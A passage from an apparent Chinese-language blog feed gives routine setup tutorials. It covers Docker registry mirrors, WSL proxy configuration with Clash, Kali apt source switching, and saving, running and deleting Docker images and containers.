for connection (Client.Timeout exceeded while awaiting headers)解决方法</h2><p>配置加速地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>docker/daemon.json</span><br></pre></td></tr></table></figure><p>添加以下内容</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.1panel.live&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;https://docker.211678.top&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.1panel.live&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://hub.rat.dev&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://do.nark.eu.org&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerpull.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://dockerproxy.cn&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://docker.awsl9527.cn&quot;</span></span><br><span class="line">      ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.m.daocloud.io&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">:wq</span></span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">system</span>ctl daemon-reload</span><br><span class="line"><span class="params">system</span>ctl restart  docker</span><br></pre></td></tr></table></figure><h2 id="五、Docker关闭不掉进程，Stopping-docker-service-but-it-can-still-be-activated-by-docker-socket"><a href="#五、Docker关闭不掉进程，Stopping-docker-service-but-it-can-still-be-activated-by-docker-socket" class="headerlink" title="五、Docker关闭不掉进程，Stopping docker.service, but it can still be activated by: docker.socket"></a>五、Docker关闭不掉进程，Stopping docker.service, but it can still be activated by: docker.socket</h2><p>解决方法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker <span class="built_in">stop</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">stop</span> docker.<span class="built_in">socket</span></span><br></pre></td></tr></table></figure><p><strong>注意：1. 关闭终端重启会解决大部分问题。</strong></p><p><strong>2. 还有以下部分是权限问题，用sudo su切换成root模式</strong></p>]]></content>
    
    
    <summary type="html">🥧wsl配置ubuntu22.04，并配置docker</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>Windows 子系统 WSL使用系统代理</title>
    <link href="https://example.com/posts/f5bf104a.html"/>
    <id>https://example.com/posts/f5bf104a.html</id>
    <published>2024-12-01T15:19:29.569Z</published>
    <updated>2024-12-01T16:06:22.802Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="WSL-Windows-子系统-WSL使用系统代理"><a href="#WSL-Windows-子系统-WSL使用系统代理" class="headerlink" title="[WSL] Windows 子系统 WSL使用系统代理"></a>[WSL] Windows 子系统 WSL使用系统代理</h1><h2 id="以Ubuntu-Clash为例"><a href="#以Ubuntu-Clash为例" class="headerlink" title="以Ubuntu + Clash为例"></a>以Ubuntu + Clash为例</h2><p>由Jeza Chen 发表于 June 3, 2020</p><p>最近使用WSL发现无法访问github相关的网站，基本都是Connection Refused，即便Windows系统使用了Clash也不能访问，按照网上一些教程，需要在WSL上进行一些配置才能用到系统的代理。</p><p>下面的操作基于WSL下的Ubuntu 20.04 LTS，主机代理软件为<a href="https://github.com/Dreamacro/clash">Clash</a>。</p><ol><li><p>在Clash软件找到HTTP代理端口(即软件里面的Port)，如下图的7890。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/clash-screenshot.png" alt="Clash截图"></p></li><li><p>在c盘的用户文件中创建.wslconfig文件，复制以下代码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="section">[experimental]</span></span><br><span class="line">   <span class="attr">autoMemoryReclaim</span>=gradual</span><br><span class="line"><span class="attr">networkingMode</span>=mirrored</span><br><span class="line">   <span class="attr">dnsTunneling</span>=<span class="literal">true</span></span><br><span class="line">   <span class="attr">firewall</span>=<span class="literal">true</span></span><br><span class="line">   <span class="attr">autoProxy</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>在WSL的终端上输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">，在末行写入</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">http_proxy</span>=127.0.0.1:7890</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> <span class="attribute">https_proxy</span>=127.0.0.1:7890</span><br></pre></td></tr></table></figure></li></ol><p>   <strong>注意这里的7890是上图Clash的HTTP代理端口号，请替换成自己本机的端口。</strong></p><ol><li>关闭终端重新打开，此时输入<code>wget google.com</code>看看代理能不能正常工作。</li></ol><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/wsl-wget-google.png" alt="Wget谷歌官网截图"></p>]]></content>
    
    
    <summary type="html">🥧Windows 子系统 WSL使用系统代理</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>kali换源</title>
    <link href="https://example.com/posts/35bc9a82.html"/>
    <id>https://example.com/posts/35bc9a82.html</id>
    <published>2024-12-01T15:19:29.567Z</published>
    <updated>2024-12-01T16:06:22.805Z</updated>
    
    <content type="html"><![CDATA[<p>一.更换源<br>   1.<br>      进入Kali Linux系统并打开命令行窗口，输入“ sudo -i ”回车输入密码以获取系统最高权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su                        <span class="comment">#获取系统最高权限命令</span></span><br></pre></td></tr></table></figure><p>   2.<br>      输入vim /etc/apt/sources.list编辑软件源配置文件。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources<span class="meta">.list</span>      <span class="meta">#使用vim访问源</span></span><br></pre></td></tr></table></figure><p>   3.<br>      将官方源如下加入“ # ”注释掉。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#官方源</span></span><br><span class="line"></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><p>   4.<br>      加入以下任意一种国内源即可。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#中科大</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta">#阿里云</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="meta">#清华大学</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb<span class="punctuation">-</span>src https<span class="punctuation">:</span><span class="comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta">#浙大</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"><span class="meta">#东软大学</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="line"><span class="meta">#重庆大学</span></span><br><span class="line">deb http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb<span class="punctuation">-</span>src http<span class="punctuation">:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><p>   5.<br>      加入之后点击“ esc ”退出编辑，输入“ :wq”回车保存并退出。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">:wq</span>                     <span class="comment">#保存并退出命令</span></span><br></pre></td></tr></table></figure><p>二.更新命令<br>   输入以下命令以进行更新(在非root状态下需在前面加入“ sudo ”)。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> update          #更新索引</span><br><span class="line">apt-<span class="built_in">get</span><span class="built_in"> upgrade </span>        #更新软件</span><br><span class="line">apt-<span class="built_in">get</span> dist-upgrade    #升级</span><br><span class="line">apt-<span class="built_in">get</span> clean           #删除缓存包</span><br><span class="line">apt-<span class="built_in">get</span> autoclean       #删除未安装的deb包</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">🥧kali换源</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>docker保存和打包镜像</title>
    <link href="https://example.com/posts/5721bfe4.html"/>
    <id>https://example.com/posts/5721bfe4.html</id>
    <published>2024-12-01T15:18:48.493Z</published>
    <updated>2024-12-01T16:06:22.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id="docker保存和打包镜像"><a href="#docker保存和打包镜像" class="headerlink" title="docker保存和打包镜像"></a>docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）"><a href="#1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）" class="headerlink" title="1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）"></a>1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）"><a href="#1-2-接下来用commit参数进行保存镜像（精简版）" class="headerlink" title="1.2 接下来用commit参数进行保存镜像（精简版）"></a>1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> commit  <span class="number">7</span>ca736d99653    yolov5:v6.<span class="number">2</span></span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar"><a href="#打包tar" class="headerlink" title="打包tar"></a>打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
    
    
    <summary type="html">🥧docker保存和打包镜像</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>docker删除镜像和容器</title>
    <link href="https://example.com/posts/329caef9.html"/>
    <id>https://example.com/posts/329caef9.html</id>
    <published>2024-12-01T15:18:48.491Z</published>
    <updated>2024-12-01T16:06:22.804Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="优雅删除镜像（推荐做法）"><a href="#优雅删除镜像（推荐做法）" class="headerlink" title="优雅删除镜像（推荐做法）"></a>优雅删除镜像（推荐做法）</h2><p>1、查看Docker要删除的镜像，如目标版本为stable-perl的Nginx，镜像ID（IMAGE ID）为 df1998569adb。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure><p>2、使用命令“docker rmi 镜像ID”删除Nginx（stable-perl）的镜像，只取“IMAGE ID”的前3个字符即可。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><p>  报错内容如下，意思是镜像（df1）存在使用中的容器（f66），不能强制删除镜像。官方的意思是要先停止容器运行，再进行镜像的删除操作吗？</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response <span class="keyword">from</span> daemon: <span class="keyword">conflict</span>: unable <span class="keyword">to</span> <span class="keyword">delete</span> df1998569adb (cannot be forced) - image <span class="keyword">is</span> being used <span class="keyword">by</span> running container f6678f2821c7</span><br></pre></td></tr></table></figure><p>3、查看Docker运行中的容器，如容器 nginx:stable-perl ，容器ID为 f66。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p>4、先停止nginx:stable-perl容器（f66）运行，再去删除Nginx（stable-perl）镜像（df1）。<br>（1）停止容器（f66）运行。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop f66</span><br></pre></td></tr></table></figure><p>（2）删除镜像（df1）。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><p>  What？都已经停止容器（f66）运行了，删除镜像（df1）怎么还报错啊！？其实，只停止容器的正常运行还不行，还有最重要的一步没做：删除容器。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response <span class="keyword">from</span> daemon: <span class="keyword">conflict</span>: unable <span class="keyword">to</span> <span class="keyword">delete</span> df1998569adb (must be forced) - image <span class="keyword">is</span> being used <span class="keyword">by</span> stopped container f6678f2821c7</span><br></pre></td></tr></table></figure><p>5、查看Docker所有容器的状态（包含运行中的和已停止的），“STATUS”为“Exited(0)”代表停止运行。执行删除容器命令“docker rm f66”，删除 nginx:stable-perl 容器，再查看 nginx:stable-perl 容器是否还在列表中。<br>（1）查看Docker所有容器的状态。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>（2）删除 nginx:stable-perl 容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> f66</span><br></pre></td></tr></table></figure><p>（3）再查看Docker所有容器的状态，发现 nginx:stable-perl 容器（f66）已经不存在了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>6、删除镜像，再查看所有镜像，发现列表中已经不存在版本为stable-perl的Nginx镜像（df1）。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rmi df1</span><br></pre></td></tr></table></figure><h2 id="优雅删除容器（推荐做法）"><a href="#优雅删除容器（推荐做法）" class="headerlink" title="优雅删除容器（推荐做法）"></a>优雅删除容器（推荐做法）</h2><p>1、查看Docker中运行中的容器，例如 Nginx ，容器ID为 39c，并删除容器。<br>（1）查看Docker中运行中的容器。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker ps</span></span><br></pre></td></tr></table></figure><p>（2）删除Nginx容器（39c）。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rm <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（3）发现会报错，报错内容如下，意思是容器还在运行，不能删除，先停止运行再删除，或直接强制删除。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Error </span>response from daemon: You cannot remove a running container 39cdb69246fdb6b623cff60af5b59e033149b6940bc5e0432c760ea245da81a9. Stop the container before attempting removal or force remove</span><br></pre></td></tr></table></figure><p>2、停止容器（39c），查看所有容器的运行状态。<br>（1）停止容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> stop <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>3、删除容器（39c），查看所有容器的运行状态。<br>（1）删除容器。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> rm <span class="number">39</span>c</span><br></pre></td></tr></table></figure><p>（2）查看所有容器的运行状态（包含运行中的和已停止的）。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><p>（3）容器（39c）已经不存在了，说明被成功删除了。</p>]]></content>
    
    
    <summary type="html">🥧docker删除镜像和容器</summary>
    
    
    
    <category term="CTF" scheme="https://example.com/categories/CTF/"/>
    
    
    <category term="其他姿势" scheme="https://example.com/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>Docker run 运行镜像</title>
    <link href="https://example.com/posts/3445c523.html"/>
    <id>https://example.com/posts/3445c523.html</id>
    <published>2024-12-01T15:18:48.489Z</published>
    <updated>2024-12-01T16:06:22.802Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker-run-运行镜像"><a href="#Docker-run-运行镜像" class="headerlink" title="Docker run 运行镜像"></a>Docker run 运行镜像</h1><p>docker run ：创建一个新的容器并运行一个命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">docker run <span class="selector-attr">[OPTIONS]</span> IMAGE <span class="selector-attr">[COMMAND]</span> <span class="selector-attr">[ARG...]</span></span><br><span class="line">OPTIONS说明：</span><br><span class="line"></span><br><span class="line">-<span class="selector-tag">a</span> stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项；</span><br><span class="line"></span><br><span class="line">-d: 后台运行容器，并返回容器ID；</span><br><span class="line"></span><br><span class="line">-<span class="selector-tag">i</span>: 以交互模式运行容器，通常与 -t 同时使用；</span><br><span class="line"></span><br><span class="line">-P: 随机端口映射，容器内部端口随机映射到主机的端口</span><br><span class="line"></span><br><span class="line">-<span class="selector-tag">p</span>: 指定端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">-t: 为容器重新分配一个伪输入终端，通常与 -<span class="selector-tag">i</span> 同时使用；</span><br><span class="line"></span><br><span class="line"><span class="attr">--name</span>=<span class="string">&quot;nginx-lb&quot;</span>: 为容器指定一个名称；</span><br><span class="line"></span><br><span class="line"><span class="attr">--dns</span> <span class="number">8.8</span>.<span class="number">8.8</span>: 指定容器使用的DNS服务器，默认和宿主一致；</span><br><span class="line"></span><br><span class="line"><span class="attr">--dns-search</span> example<span class="selector-class">.com</span>: 指定容器DNS搜索域名，默认和宿主一致；</span><br><span class="line"></span><br><span class="line">-h <span class="string">&quot;mars&quot;</span>: 指定容器的hostname；</span><br><span class="line"></span><br><span class="line">-e username=<span class="string">&quot;ritchie&quot;</span>: 设置环境变量；</span><br><span class="line"></span><br><span class="line"><span class="attr">--env-file</span>=<span class="selector-attr">[]</span>: 从指定文件读入环境变量；</span><br><span class="line"></span><br><span class="line"><span class="attr">--cpuset</span>=<span class="string">&quot;0-2&quot;</span> or <span class="attr">--cpuset</span>=<span class="string">&quot;0,1,2&quot;</span>: 绑定容器到指定CPU运行；</span><br><span class="line"></span><br><span class="line">-m :设置容器使用内存最大值；</span><br><span class="line"></span><br><span class="line"><span class="attr">--net</span>=<span class="string">&quot;bridge&quot;</span>: 指定容器的网络连接类型，支持 bridge/host/<span class="attribute">none</span>/container: 四种类型；</span><br><span class="line"></span><br><span class="line"><span class="attr">--link</span>=<span class="selector-attr">[]</span>: 添加链接到另一个容器；</span><br><span class="line"></span><br><span class="line"><span class="attr">--expose</span>=<span class="selector-attr">[]</span>: 开放一个端口或一组端口；</span><br><span class="line"></span><br><span class="line"><span class="attr">--volume</span> , -v: 绑定一个卷</span><br></pre></td></tr></table></figure><p>Docker 镜像只有运行起来，才会创建一个容器，才能提供对外服务</p><p>这里我们先不解释什么是镜像，我们只解释它们之间的关系和类比</p><p>我们先说镜像，镜像有点类似于已经打包好了，放在腾讯服务器上的，但还没有装在电脑上的 QQ 安装程序</p><p>那么容器，就相当于一个已经在用户电脑上安装好的 QQ 软件，只要输入 QQ 号和密码，就可以使用了</p><p>它们之间一样么？ 不一样的</p><ol><li>QQ 安装程序，人人都可以下，但是只要不安装，它就不能使用，它只是一个安装程序而已</li><li>已经安装好的 QQ 程序，这时候就不是人人都能用了，只有电脑的主人才能用，而且这时候可以登录然后聊天了</li></ol><p>相比较于 Docker ，我们只有把一个镜像 <code>run</code> 起来，它才能对外提供服务</p><p>将一个镜像转换成容器，使用的就是 <code>docker run</code> 命令</p><h2 id="Docker-Hello-World"><a href="#Docker-Hello-World" class="headerlink" title="Docker Hello World"></a>Docker Hello World</h2><p><code>docker run</code> 命令可以从一个镜像创建一个容器，并运行一个应用程序</p><p>比如下面的 <code>docker run</code> 命令从 <code>ubuntu:17.10</code> 镜像创建一个容器，并运行 <code>echo &quot;Hello world&quot;</code> 服务输出 Hello world</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker run ubuntu:<span class="number">17.10</span> /bin/<span class="keyword">echo</span> <span class="string">&quot;Hello world&quot;</span></span><br><span class="line">Unable <span class="keyword">to</span> <span class="keyword">find</span> image <span class="string">&#x27;ubuntu:17.10&#x27;</span> locally</span><br><span class="line"><span class="number">17.10</span>: Pulling from library/ubuntu</span><br><span class="line"><span class="number">68393378</span>db12: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">9</span>e3366501e0e: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">156</span>ec05da9a5: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">281</span>cba1133d9: Pull <span class="built_in">complete</span> </span><br><span class="line"><span class="number">0</span>acdc2cc8ed1: Pull <span class="built_in">complete</span> </span><br><span class="line">Digest: <span class="built_in">sha256</span>:<span class="number">20</span>ed22f88148889c94970cb325b5341f455c820aa6d3289ce4b721b14c78c242</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:<span class="number">17.10</span></span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>docker</td><td>Docker 的二进制执行文件</td></tr><tr><td>run</td><td>与前面的 docker 组合来运行一个容器</td></tr><tr><td>ubuntu:17.10</td><td>指定要运行的镜像，Docker 首先从本地主机上查找镜像是否存在 如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像</td></tr><tr><td>/bin/echo “Hello world</td><td>在启动的容器里执行的命令</td></tr></tbody></table></div><p>更多 <code>docker start</code> 命令使用方法，可以访问 <a href="https://twle.cn/l/yufei/docker/docker-basic-start-command.html">docker start 命令</a></p><h2 id="运行交互式的容器"><a href="#运行交互式的容器" class="headerlink" title="运行交互式的容器"></a>运行交互式的容器</h2><p>使用 <code>docker run</code> 如果添加了 <code>-i</code> 和 <code>-t</code> 或者 <code>-it</code> 参数，那么 Docker 就会创建一个交互式的容器，可以实现应答模式</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># docker run -i -t ubuntu:17.10 /bin/bash</span></span><br><span class="line">root<span class="variable">@1bc08b56d08f</span><span class="symbol">:/</span><span class="comment">#  </span></span><br></pre></td></tr></table></figure><blockquote><p>这次执行的时候没有从远程拉取 ubuntu:17.10 镜像了，而是使用的本地版本</p></blockquote><div class="table-container"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-t</td><td>在新容器内指定一个伪终端或终端</td></tr><tr><td>-i</td><td>允许对容器内的标准输入 ( STDIN ) 